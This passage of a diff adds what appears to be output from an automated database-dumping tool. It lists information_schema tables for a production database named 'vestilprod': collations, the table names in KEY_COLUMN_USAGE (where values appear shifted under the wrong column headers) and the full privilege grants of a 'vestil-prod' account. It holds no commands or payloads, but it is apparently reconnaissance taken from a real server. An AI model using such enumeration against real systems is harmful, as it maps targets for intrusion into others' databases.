+| 64  | 1       | <blank>    | Yes         | armscii8_bin             | armscii8           |
+| 33  | 1       | Yes        | Yes         | utf8_general_ci          | utf8               |
+| 83  | 1       | <blank>    | Yes         | utf8_bin                 | utf8               |
+| 192 | 8       | <blank>    | Yes         | utf8_unicode_ci          | utf8               |
+| 193 | 8       | <blank>    | Yes         | utf8_icelandic_ci        | utf8               |
+| 194 | 8       | <blank>    | Yes         | utf8_latvian_ci          | utf8               |
+| 195 | 8       | <blank>    | Yes         | utf8_romanian_ci         | utf8               |
+| 196 | 8       | <blank>    | Yes         | utf8_slovenian_ci        | utf8               |
+| 197 | 8       | <blank>    | Yes         | utf8_polish_ci           | utf8               |
+| 198 | 8       | <blank>    | Yes         | utf8_estonian_ci         | utf8               |
+| 199 | 8       | <blank>    | Yes         | utf8_spanish_ci          | utf8               |
+| 200 | 8       | <blank>    | Yes         | utf8_swedish_ci          | utf8               |
+| 201 | 8       | <blank>    | Yes         | utf8_turkish_ci          | utf8               |
+| 202 | 8       | <blank>    | Yes         | utf8_czech_ci            | utf8               |
+| 203 | 8       | <blank>    | Yes         | utf8_danish_ci           | utf8               |
+| 204 | 8       | <blank>    | Yes         | utf8_lithuanian_ci       | utf8               |
+| 205 | 8       | <blank>    | Yes         | utf8_slovak_ci           | utf8               |
+| 206 | 8       | <blank>    | Yes         | utf8_spanish2_ci         | utf8               |
+| 207 | 8       | <blank>    | Yes         | utf8_roman_ci            | utf8               |
+| 208 | 8       | <blank>    | Yes         | utf8_persian_ci          | utf8               |
+| 209 | 8       | <blank>    | Yes         | utf8_esperanto_ci        | utf8               |
+| 210 | 8       | <blank>    | Yes         | utf8_hungarian_ci        | utf8               |
+| 211 | 8       | <blank>    | Yes         | utf8_sinhala_ci          | utf8               |
+| 212 | 8       | <blank>    | Yes         | utf8_german2_ci          | utf8               |
+| 213 | 8       | <blank>    | Yes         | utf8_croatian_ci         | utf8               |
+| 214 | 8       | <blank>    | Yes         | utf8_unicode_520_ci      | utf8               |
+| 215 | 8       | <blank>    | Yes         | utf8_vietnamese_ci       | utf8               |
+| 223 | 1       | <blank>    | Yes         | utf8_general_mysql500_ci | utf8               |
+| 35  | 1       | Yes        | Yes         | ucs2_general_ci          | ucs2               |
+| 90  | 1       | <blank>    | Yes         | ucs2_bin                 | ucs2               |
+| 128 | 8       | <blank>    | Yes         | ucs2_unicode_ci          | ucs2               |
+| 129 | 8       | <blank>    | Yes         | ucs2_icelandic_ci        | ucs2               |
+| 130 | 8       | <blank>    | Yes         | ucs2_latvian_ci          | ucs2               |
+| 131 | 8       | <blank>    | Yes         | ucs2_romanian_ci         | ucs2               |
+| 132 | 8       | <blank>    | Yes         | ucs2_slovenian_ci        | ucs2               |
+| 133 | 8       | <blank>    | Yes         | ucs2_polish_ci           | ucs2               |
+| 134 | 8       | <blank>    | Yes         | ucs2_estonian_ci         | ucs2               |
+| 135 | 8       | <blank>    | Yes         | ucs2_spanish_ci          | ucs2               |
+| 136 | 8       | <blank>    | Yes         | ucs2_swedish_ci          | ucs2               |
+| 137 | 8       | <blank>    | Yes         | ucs2_turkish_ci          | ucs2               |
+| 138 | 8       | <blank>    | Yes         | ucs2_czech_ci            | ucs2               |
+| 139 | 8       | <blank>    | Yes         | ucs2_danish_ci           | ucs2               |
+| 140 | 8       | <blank>    | Yes         | ucs2_lithuanian_ci       | ucs2               |
+| 141 | 8       | <blank>    | Yes         | ucs2_slovak_ci           | ucs2               |
+| 142 | 8       | <blank>    | Yes         | ucs2_spanish2_ci         | ucs2               |
+| 143 | 8       | <blank>    | Yes         | ucs2_roman_ci            | ucs2               |
+| 144 | 8       | <blank>    | Yes         | ucs2_persian_ci          | ucs2               |
+| 145 | 8       | <blank>    | Yes         | ucs2_esperanto_ci        | ucs2               |
+| 146 | 8       | <blank>    | Yes         | ucs2_hungarian_ci        | ucs2               |
+| 147 | 8       | <blank>    | Yes         | ucs2_sinhala_ci          | ucs2               |
+| 148 | 8       | <blank>    | Yes         | ucs2_german2_ci          | ucs2               |
+| 149 | 8       | <blank>    | Yes         | ucs2_croatian_ci         | ucs2               |
+| 150 | 8       | <blank>    | Yes         | ucs2_unicode_520_ci      | ucs2               |
+| 151 | 8       | <blank>    | Yes         | ucs2_vietnamese_ci       | ucs2               |
+| 159 | 1       | <blank>    | Yes         | ucs2_general_mysql500_ci | ucs2               |
+| 36  | 1       | Yes        | Yes         | cp866_general_ci         | cp866              |
+| 68  | 1       | <blank>    | Yes         | cp866_bin                | cp866              |
+| 37  | 1       | Yes        | Yes         | keybcs2_general_ci       | keybcs2            |
+| 73  | 1       | <blank>    | Yes         | keybcs2_bin              | keybcs2            |
+| 38  | 1       | Yes        | Yes         | macce_general_ci         | macce              |
+| 43  | 1       | <blank>    | Yes         | macce_bin                | macce              |
+| 39  | 1       | Yes        | Yes         | macroman_general_ci      | macroman           |
+| 53  | 1       | <blank>    | Yes         | macroman_bin             | macroman           |
+| 40  | 1       | Yes        | Yes         | cp852_general_ci         | cp852              |
+| 81  | 1       | <blank>    | Yes         | cp852_bin                | cp852              |
+| 20  | 1       | <blank>    | Yes         | latin7_estonian_cs       | latin7             |
+| 41  | 1       | Yes        | Yes         | latin7_general_ci        | latin7             |
+| 42  | 1       | <blank>    | Yes         | latin7_general_cs        | latin7             |
+| 79  | 1       | <blank>    | Yes         | latin7_bin               | latin7             |
+| 45  | 1       | Yes        | Yes         | utf8mb4_general_ci       | utf8mb4            |
+| 46  | 1       | <blank>    | Yes         | utf8mb4_bin              | utf8mb4            |
+| 224 | 8       | <blank>    | Yes         | utf8mb4_unicode_ci       | utf8mb4            |
+| 225 | 8       | <blank>    | Yes         | utf8mb4_icelandic_ci     | utf8mb4            |
+| 226 | 8       | <blank>    | Yes         | utf8mb4_latvian_ci       | utf8mb4            |
+| 227 | 8       | <blank>    | Yes         | utf8mb4_romanian_ci      | utf8mb4            |
+| 228 | 8       | <blank>    | Yes         | utf8mb4_slovenian_ci     | utf8mb4            |
+| 229 | 8       | <blank>    | Yes         | utf8mb4_polish_ci        | utf8mb4            |
+| 230 | 8       | <blank>    | Yes         | utf8mb4_estonian_ci      | utf8mb4            |
+| 231 | 8       | <blank>    | Yes         | utf8mb4_spanish_ci       | utf8mb4            |
+| 232 | 8       | <blank>    | Yes         | utf8mb4_swedish_ci       | utf8mb4            |
+| 233 | 8       | <blank>    | Yes         | utf8mb4_turkish_ci       | utf8mb4            |
+| 234 | 8       | <blank>    | Yes         | utf8mb4_czech_ci         | utf8mb4            |
+| 235 | 8       | <blank>    | Yes         | utf8mb4_danish_ci        | utf8mb4            |
+| 236 | 8       | <blank>    | Yes         | utf8mb4_lithuanian_ci    | utf8mb4            |
+| 237 | 8       | <blank>    | Yes         | utf8mb4_slovak_ci        | utf8mb4            |
+| 238 | 8       | <blank>    | Yes         | utf8mb4_spanish2_ci      | utf8mb4            |
+| 239 | 8       | <blank>    | Yes         | utf8mb4_roman_ci         | utf8mb4            |
+| 240 | 8       | <blank>    | Yes         | utf8mb4_persian_ci       | utf8mb4            |
+| 241 | 8       | <blank>    | Yes         | utf8mb4_esperanto_ci     | utf8mb4            |
+| 242 | 8       | <blank>    | Yes         | utf8mb4_hungarian_ci     | utf8mb4            |
+| 243 | 8       | <blank>    | Yes         | utf8mb4_sinhala_ci       | utf8mb4            |
+| 244 | 8       | <blank>    | Yes         | utf8mb4_german2_ci       | utf8mb4            |
+| 245 | 8       | <blank>    | Yes         | utf8mb4_croatian_ci      | utf8mb4            |
+| 246 | 8       | <blank>    | Yes         | utf8mb4_unicode_520_ci   | utf8mb4            |
+| 247 | 8       | <blank>    | Yes         | utf8mb4_vietnamese_ci    | utf8mb4            |
+| 14  | 1       | <blank>    | Yes         | cp1251_bulgarian_ci      | cp1251             |
+| 23  | 1       | <blank>    | Yes         | cp1251_ukrainian_ci      | cp1251             |
+| 50  | 1       | <blank>    | Yes         | cp1251_bin               | cp1251             |
+| 51  | 1       | Yes        | Yes         | cp1251_general_ci        | cp1251             |
+| 52  | 1       | <blank>    | Yes         | cp1251_general_cs        | cp1251             |
+| 54  | 1       | Yes        | Yes         | utf16_general_ci         | utf16              |
+| 55  | 1       | <blank>    | Yes         | utf16_bin                | utf16              |
+| 101 | 8       | <blank>    | Yes         | utf16_unicode_ci         | utf16              |
+| 102 | 8       | <blank>    | Yes         | utf16_icelandic_ci       | utf16              |
+| 103 | 8       | <blank>    | Yes         | utf16_latvian_ci         | utf16              |
+| 104 | 8       | <blank>    | Yes         | utf16_romanian_ci        | utf16              |
+| 105 | 8       | <blank>    | Yes         | utf16_slovenian_ci       | utf16              |
+| 106 | 8       | <blank>    | Yes         | utf16_polish_ci          | utf16              |
+| 107 | 8       | <blank>    | Yes         | utf16_estonian_ci        | utf16              |
+| 108 | 8       | <blank>    | Yes         | utf16_spanish_ci         | utf16              |
+| 109 | 8       | <blank>    | Yes         | utf16_swedish_ci         | utf16              |
+| 110 | 8       | <blank>    | Yes         | utf16_turkish_ci         | utf16              |
+| 111 | 8       | <blank>    | Yes         | utf16_czech_ci           | utf16              |
+| 112 | 8       | <blank>    | Yes         | utf16_danish_ci          | utf16              |
+| 113 | 8       | <blank>    | Yes         | utf16_lithuanian_ci      | utf16              |
+| 114 | 8       | <blank>    | Yes         | utf16_slovak_ci          | utf16              |
+| 115 | 8       | <blank>    | Yes         | utf16_spanish2_ci        | utf16              |
+| 116 | 8       | <blank>    | Yes         | utf16_roman_ci           | utf16              |
+| 117 | 8       | <blank>    | Yes         | utf16_persian_ci         | utf16              |
+| 118 | 8       | <blank>    | Yes         | utf16_esperanto_ci       | utf16              |
+| 119 | 8       | <blank>    | Yes         | utf16_hungarian_ci       | utf16              |
+| 120 | 8       | <blank>    | Yes         | utf16_sinhala_ci         | utf16              |
+| 121 | 8       | <blank>    | Yes         | utf16_german2_ci         | utf16              |
+| 122 | 8       | <blank>    | Yes         | utf16_croatian_ci        | utf16              |
+| 123 | 8       | <blank>    | Yes         | utf16_unicode_520_ci     | utf16              |
+| 124 | 8       | <blank>    | Yes         | utf16_vietnamese_ci      | utf16              |
+| 56  | 1       | Yes        | Yes         | utf16le_general_ci       | utf16le            |
+| 62  | 1       | <blank>    | Yes         | utf16le_bin              | utf16le            |
+| 57  | 1       | Yes        | Yes         | cp1256_general_ci        | cp1256             |
+| 67  | 1       | <blank>    | Yes         | cp1256_bin               | cp1256             |
+| 29  | 1       | <blank>    | Yes         | cp1257_lithuanian_ci     | cp1257             |
+| 58  | 1       | <blank>    | Yes         | cp1257_bin               | cp1257             |
+| 59  | 1       | Yes        | Yes         | cp1257_general_ci        | cp1257             |
+| 60  | 1       | Yes        | Yes         | utf32_general_ci         | utf32              |
+| 61  | 1       | <blank>    | Yes         | utf32_bin                | utf32              |
+| 160 | 8       | <blank>    | Yes         | utf32_unicode_ci         | utf32              |
+| 161 | 8       | <blank>    | Yes         | utf32_icelandic_ci       | utf32              |
+| 162 | 8       | <blank>    | Yes         | utf32_latvian_ci         | utf32              |
+| 163 | 8       | <blank>    | Yes         | utf32_romanian_ci        | utf32              |
+| 164 | 8       | <blank>    | Yes         | utf32_slovenian_ci       | utf32              |
+| 165 | 8       | <blank>    | Yes         | utf32_polish_ci          | utf32              |
+| 166 | 8       | <blank>    | Yes         | utf32_estonian_ci        | utf32              |
+| 167 | 8       | <blank>    | Yes         | utf32_spanish_ci         | utf32              |
+| 168 | 8       | <blank>    | Yes         | utf32_swedish_ci         | utf32              |
+| 169 | 8       | <blank>    | Yes         | utf32_turkish_ci         | utf32              |
+| 170 | 8       | <blank>    | Yes         | utf32_czech_ci           | utf32              |
+| 171 | 8       | <blank>    | Yes         | utf32_danish_ci          | utf32              |
+| 172 | 8       | <blank>    | Yes         | utf32_lithuanian_ci      | utf32              |
+| 173 | 8       | <blank>    | Yes         | utf32_slovak_ci          | utf32              |
+| 174 | 8       | <blank>    | Yes         | utf32_spanish2_ci        | utf32              |
+| 175 | 8       | <blank>    | Yes         | utf32_roman_ci           | utf32              |
+| 176 | 8       | <blank>    | Yes         | utf32_persian_ci         | utf32              |
+| 177 | 8       | <blank>    | Yes         | utf32_esperanto_ci       | utf32              |
+| 178 | 8       | <blank>    | Yes         | utf32_hungarian_ci       | utf32              |
+| 179 | 8       | <blank>    | Yes         | utf32_sinhala_ci         | utf32              |
+| 180 | 8       | <blank>    | Yes         | utf32_german2_ci         | utf32              |
+| 181 | 8       | <blank>    | Yes         | utf32_croatian_ci        | utf32              |
+| 182 | 8       | <blank>    | Yes         | utf32_unicode_520_ci     | utf32              |
+| 183 | 8       | <blank>    | Yes         | utf32_vietnamese_ci      | utf32              |
+| 63  | 1       | Yes        | Yes         | binary                   | binary             |
+| 92  | 1       | Yes        | Yes         | geostd8_general_ci       | geostd8            |
+| 93  | 1       | <blank>    | Yes         | geostd8_bin              | geostd8            |
+| 95  | 1       | Yes        | Yes         | cp932_japanese_ci        | cp932              |
+| 96  | 1       | <blank>    | Yes         | cp932_bin                | cp932              |
+| 97  | 1       | Yes        | Yes         | eucjpms_japanese_ci      | eucjpms            |
+| 98  | 1       | <blank>    | Yes         | eucjpms_bin              | eucjpms            |
+| 248 | 2       | Yes        | Yes         | gb18030_chinese_ci       | gb18030            |
+| 249 | 1       | <blank>    | Yes         | gb18030_bin              | gb18030            |
+| 250 | 8       | <blank>    | Yes         | gb18030_unicode_520_ci   | gb18030            |
++-----+---------+------------+-------------+--------------------------+--------------------+
+
+Database: information_schema
+Table: KEY_COLUMN_USAGE
+[38 entries]
++--------------+--------------+---------------+----------------+------------------+-------------------+---------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+
+| TABLE_SCHEMA | TABLE_NAME   | TABLE_CATALOG | COLUMN_NAME    | ORDINAL_POSITION | CONSTRAINT_NAME   | CONSTRAINT_SCHEMA   | CONSTRAINT_CATALOG   | REFERENCED_TABLE_NAME | REFERENCED_COLUMN_NAME | REFERENCED_TABLE_SCHEMA | POSITION_IN_UNIQUE_CONSTRAINT |
++--------------+--------------+---------------+----------------+------------------+-------------------+---------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+
+| vestilprod   | <blank>      | PRIMARY       | 360pic         | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | Casters        | 1                | <blank>           | <blank>             | <blank>              | Model                 | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | Category       | 1                | <blank>           | <blank>             | <blank>              | FID                   | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | Color          | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | ExtBody        | 1                | <blank>           | <blank>             | <blank>              | FID                   | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | FAQ            | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | Family         | 1                | <blank>           | <blank>             | <blank>              | FID                   | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | Images         | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | IndustryCat    | 1                | <blank>           | <blank>             | <blank>              | IID                   | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | Jobs           | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | Mailing        | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | ProductData    | 1                | <blank>           | <blank>             | <blank>              | Model                 | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | SDS            | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | SDSModels      | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | SKU            | 1                | <blank>           | <blank>             | <blank>              | SKU                   | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | SND            | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | Tabs           | 1                | <blank>           | <blank>             | <blank>              | FID                   | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | WGI            | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | catalogs       | 1                | <blank>           | <blank>             | <blank>              | Vestil                | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | certificates   | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | drawings       | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | industry       | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | manuals        | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | surveys        | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | syndigo        | 1                | <blank>           | <blank>             | <blank>              | Model                 | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | vback          | 1                | <blank>           | <blank>             | <blank>              | id                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | vcasters       | 1                | <blank>           | <blank>             | <blank>              | Model                 | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | vemployee      | 1                | <blank>           | <blank>             | <blank>              | id                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | vestilian      | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | vleadtime      | 1                | <blank>           | <blank>             | <blank>              | Model                 | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | vleadtime_test | 1                | <blank>           | <blank>             | <blank>              | Model                 | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | vmatrix        | 1                | <blank>           | <blank>             | <blank>              | model                 | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | vnewprod       | 1                | <blank>           | <blank>             | <blank>              | Model                 | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | voption        | 1                | <blank>           | <blank>             | <blank>              | Model                 | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | voverstock     | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | vquickship     | 1                | <blank>           | <blank>             | <blank>              | Model                 | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | vspecials      | 1                | <blank>           | <blank>             | <blank>              | ID                    | vestilprod             | def                     | def                           |
+| vestilprod   | <blank>      | PRIMARY       | zks-proposal1  | 1                | <blank>           | <blank>             | <blank>              | model                 | vestilprod             | def                     | def                           |
++--------------+--------------+---------------+----------------+------------------+-------------------+---------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+
+
+Database: information_schema
+Table: SCHEMA_PRIVILEGES
+[18 entries]
++---------------------------+--------------+--------------+---------------+-------------------------+
+| GRANTEE                   | IS_GRANTABLE | TABLE_SCHEMA | TABLE_CATALOG | PRIVILEGE_TYPE          |
++---------------------------+--------------+--------------+---------------+-------------------------+
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | SELECT                  |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | INSERT                  |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | UPDATE                  |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | DELETE                  |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | CREATE                  |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | DROP                    |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | REFERENCES              |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | INDEX                   |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | ALTER                   |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | CREATE TEMPORARY TABLES |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | LOCK TABLES             |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | EXECUTE                 |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | CREATE VIEW             |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | SHOW VIEW               |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | CREATE ROUTINE          |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | ALTER ROUTINE           |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | EVENT                   |
+| 'vestil-prod'@'localhost' | NO           | vestilprod   | def           | TRIGGER                 |
++---------------------------+--------------+--------------+---------------+-------------------------+
+
+Database: information_schema
+Table: OPTIMIZER_TRACE
+[0 entries]
++-------+---------+-------------------------+-----------------------------------+
+| TRACE | QUERY   | INSUFFICIENT_PRIVILEGES | MISSING_BYTES_BEYOND_MAX_MEM_SIZE |
++-------+---------+-------------------------+-----------------------------------+
++-------+---------+-------------------------+-----------------------------------+
+
